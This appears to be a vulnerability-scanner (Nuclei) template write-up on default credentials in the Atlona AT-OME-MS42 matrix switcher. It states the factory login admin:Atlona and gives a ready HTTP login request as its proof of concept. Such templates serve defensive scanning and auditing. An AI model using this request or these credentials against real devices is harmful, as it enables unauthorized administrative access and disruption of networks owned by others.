# Nuclei Template: Atlona AT-OME-MS42 - Default Login
**Template ID:** atlona-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`atlona-default-login.yaml`)

## Vulnerability Information & PoC

## Description
The Atlona AT-OME-MS42, a 4x2 matrix switcher supporting HDMI, USB-C, and DisplayPort inputs, is accessible via a built-in web management interface. By default, this interface uses the factory-set credentials admin:Atlona. If left unchanged, attackers could gain unauthorized administrative access to the device, potentially allowing them to alter configurations, disrupt AV switching, or pivot further into the network.

## Steps to reproduce / Exploit Payload
```http
POST /cgi-bin/login.cgi?ssid={{base64('admin:Atlona')}} HTTP/1.1
Host: {{Hostname}}
Authorization: Basic undefined
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Cookie: SSID=
```

## References
- https://atlona.com/pdf/manuals/AT-OME-MS42_G.pdf
